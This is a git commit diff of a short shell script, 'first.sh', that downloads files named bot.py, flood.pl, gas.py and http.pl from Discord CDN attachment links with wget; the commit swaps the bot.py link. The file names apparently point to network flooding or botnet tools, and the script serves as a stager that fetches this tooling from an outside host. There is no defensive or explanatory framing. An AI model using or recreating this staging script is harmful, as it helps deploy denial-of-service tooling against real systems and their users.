80afe8766d29a51deaaaed9191405e7f19ba995e
Hogrider69694204154352 <114523003+Hogrider69694204154352@users.noreply.github.com>
2022-09-27 21:14:31 +0200

    Update first.sh

--- first.sh
+++ first.sh
@@ -1,4 +1,4 @@
-wget https://cdn.discordapp.com/attachments/999398139276574740/999398259682443456/bot.py
+wget https://cdn.discordapp.com/attachments/989611230161420318/1024397768824995951/bot.py
 wget https://cdn.discordapp.com/attachments/999398139276574740/999398246273274066/flood.pl
 wget https://cdn.discordapp.com/attachments/999398139276574740/999398224412561460/gas.py
 wget https://cdn.discordapp.com/attachments/999398139276574740/999398215239618592/http.pl
